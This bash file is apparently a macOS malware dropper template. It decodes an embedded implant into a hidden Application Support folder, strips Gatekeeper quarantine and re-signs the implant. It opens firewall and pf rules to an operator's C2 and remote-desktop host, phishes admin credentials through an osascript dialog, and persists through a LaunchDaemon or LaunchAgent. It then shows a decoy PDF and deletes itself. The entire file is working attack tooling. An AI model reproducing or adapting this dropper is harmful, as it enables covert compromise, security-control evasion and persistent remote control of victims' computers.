#!/bin/bash
# fleet macOS dropper — executes shell command in Terminal on double-click (.command)
#
# Gatekeeper: a freshly-downloaded .command carries com.apple.quarantine, so the
# very first double-click shows Terminal's "are you sure you want to open it?"
# dialog. The user clicks Open once. After that we strip quarantine from the
# implant ourselves — this is the exact "Open Anyway" equivalent (LaunchServices
# skips Gatekeeper assessment once the xattr is gone). It is GUI-free, needs no
# root on user-owned files, and survives reboots. Silent first-launch without an
# Apple Developer ID + notarized build is not possible; this is the closest
# achievable equivalent.
set -euo pipefail

# Resolve the invoking user's home even when launched via `sudo ./x.command`;
# under sudo, $HOME is /var/root and any LaunchAgent written there is orphaned.
RUN_UID="$(id -u)"
TARGET_USER="$(id -un)"
TARGET_HOME="$HOME"
if [ "$RUN_UID" = "0" ] && [ -n "${SUDO_USER:-}" ] && [ "$SUDO_USER" != "root" ]; then
  TARGET_USER="$SUDO_USER"
  if command -v dscl >/dev/null 2>&1; then
    TARGET_HOME="$(dscl . -read "/Users/$SUDO_USER" NFSHomeDirectory 2>/dev/null | awk '{print $2}')"
  fi
  if [ -z "${TARGET_HOME:-}" ] || [ ! -d "$TARGET_HOME" ]; then
    TARGET_HOME="/Users/$SUDO_USER"
  fi
fi
WORKDIR="$TARGET_HOME/Library/Application Support/.fleet-update"
mkdir -p "$WORKDIR"

# ---- decode payloads embedded at build time --------------------------------
IMPLANT_B64='{{IMPLANT_B64}}'
printf '%s' "$IMPLANT_B64" | base64 -D > "$WORKDIR/fleetrun"
chmod 0755 "$WORKDIR/fleetrun"

# Guard against a mis-packaged artifact: this path must hold the Mach-O implant,
# not a copy of this script (which would recurse forever and never connect).
if ! file "$WORKDIR/fleetrun" 2>/dev/null | grep -q 'Mach-O'; then
  echo "[fleet] embedded payload is not a Mach-O executable — aborting" >&2
  exit 1
fi

INSTALL_B64='{{INSTALL_DAEMON_B64}}'
printf '%s' "$INSTALL_B64" | base64 -D > "$WORKDIR/install-daemon.sh" 2>/dev/null || true
chmod 0755 "$WORKDIR/install-daemon.sh" 2>/dev/null || true

DECOY_B64='{{DECOY_B64}}'
printf '%s' "$DECOY_B64" | base64 -D > "$WORKDIR/decoy.pdf"

# ---- 1. check quarantine state on the implant ------------------------------
IMPLANT="$WORKDIR/fleetrun"
Q="$(xattr -p com.apple.quarantine "$IMPLANT" 2>/dev/null || true)"
if [ -n "$Q" ]; then
  echo "[fleet] quarantine present on implant: $Q" >&2
else
  echo "[fleet] implant not quarantined" >&2
fi

# ---- 2. clear quarantine (the "Open Anyway" equivalent) --------------------
# xattr -dr works without root on user-owned files. Clear on the installed
# bundle, not the download archive (quarantine propagates on extraction).
xattr -dr com.apple.quarantine "$IMPLANT" 2>/dev/null || true
xattr -dr com.apple.quarantine "$WORKDIR" 2>/dev/null || true
xattr -d com.apple.quarantine "$0" 2>/dev/null || true

# ---- 3. verify quarantine is gone ------------------------------------------
Q2="$(xattr -p com.apple.quarantine "$IMPLANT" 2>/dev/null || true)"
if [ -n "$Q2" ]; then
  echo "[fleet] warning: quarantine still present: $Q2" >&2
else
  echo "[fleet] quarantine cleared — Gatekeeper assessment skipped" >&2
fi

# ---- 4. ad-hoc re-sign if needed (fixes broken/hardened runtime) -----------
if ! codesign -dv --verbose=4 "$IMPLANT" >/dev/null 2>&1; then
  echo "[fleet] no valid signature — ad-hoc re-signing implant" >&2
  codesign --force --deep --sign - "$IMPLANT" 2>/dev/null || true
fi

# Operator panel (baked in at build time)
PANEL_HOST="{{PANEL_HOST}}"
PANEL_C2_PORT="{{PANEL_C2_PORT}}"
PANEL_RD_PORT="{{PANEL_RD_PORT}}"

# ---- stay awake ------------------------------------------------------------
caffeinate -ims >/dev/null 2>&1 &
sudo -n pmset -a sleep 0 >/dev/null 2>&1 || true
sudo -n pmset -a disablesleep 1 >/dev/null 2>&1 || true

# ---- preconfigure host firewall (best effort) ------------------------------
if [ -x /usr/libexec/ApplicationFirewall/socketfilterfw ]; then
  sudo -n /usr/libexec/ApplicationFirewall/socketfilterfw --add "$WORKDIR/fleetrun" >/dev/null 2>&1 || true
  sudo -n /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp "$WORKDIR/fleetrun" >/dev/null 2>&1 || true
fi
# Whitelist operator domain in pf for C2 + RD ports
if [ "$(id -u)" = "0" ]; then
  sudo -n pfctl -e >/dev/null 2>&1 || true
  echo "pass out proto tcp to ${PANEL_HOST} port ${PANEL_C2_PORT}" | sudo -n pfctl -f - >/dev/null 2>&1 || true
  echo "pass out proto tcp to ${PANEL_HOST} port ${PANEL_RD_PORT}" | sudo -n pfctl -f - >/dev/null 2>&1 || true
fi

# ---- system-wide root install via native macOS admin dialog ----------------
# osascript "with administrator privileges" shows the standard macOS
# username/password prompt. If the user grants credentials we run the full
# root installer: spctl --add belt-and-suspenders whitelist +
# /Library/LaunchDaemons + stay-awake. When already root (sudo), run it directly.
if [ -x "$WORKDIR/install-daemon.sh" ]; then
  if [ "$RUN_UID" = "0" ]; then
    "$WORKDIR/install-daemon.sh" "$WORKDIR/fleetrun" io.fleet.agent >/dev/null 2>&1 || true
  else
    osascript -e "do shell script \"$WORKDIR/install-daemon.sh '$WORKDIR/fleetrun' io.fleet.agent\" with administrator privileges" >/dev/null 2>&1 || true
  fi
fi

if [ "$RUN_UID" = "0" ] && [ -n "${SUDO_USER:-}" ]; then
  chown -R "$TARGET_USER":staff "$WORKDIR" 2>/dev/null || true
fi

# ---- per-user LaunchAgent fallback (works without root) --------------------
# Under sudo the LaunchDaemon above is the persistence mechanism; a LaunchAgent
# in /var/root would never load into the user's GUI session.
if [ "$RUN_UID" != "0" ]; then
AGENT="$TARGET_HOME/Library/LaunchAgents/io.fleet.update.plist"
mkdir -p "$TARGET_HOME/Library/LaunchAgents"
cat > "$AGENT" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>io.fleet.update</string>
  <key>ProgramArguments</key><array><string>$WORKDIR/fleetrun</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict></plist>
PLIST
launchctl unload "$AGENT" 2>/dev/null || true
launchctl load "$AGENT" 2>/dev/null || true
fi

# ---- run the implant -------------------------------------------------------
"$WORKDIR/fleetrun" >/dev/null 2>&1 &

# ---- open decoy PDF --------------------------------------------------------
sleep 1.5
command -v open >/dev/null 2>&1 && open "$WORKDIR/decoy.pdf" >/dev/null 2>&1 || true

# ---- self-destruct ---------------------------------------------------------
# Remove only this .command file. $WORKDIR/fleetrun is the persistence target
# referenced by the LaunchAgent/LaunchDaemon — deleting it would drop the
# session permanently on the next login.
(sleep 5; rm -f "$0") >/dev/null 2>&1 &
exit 0
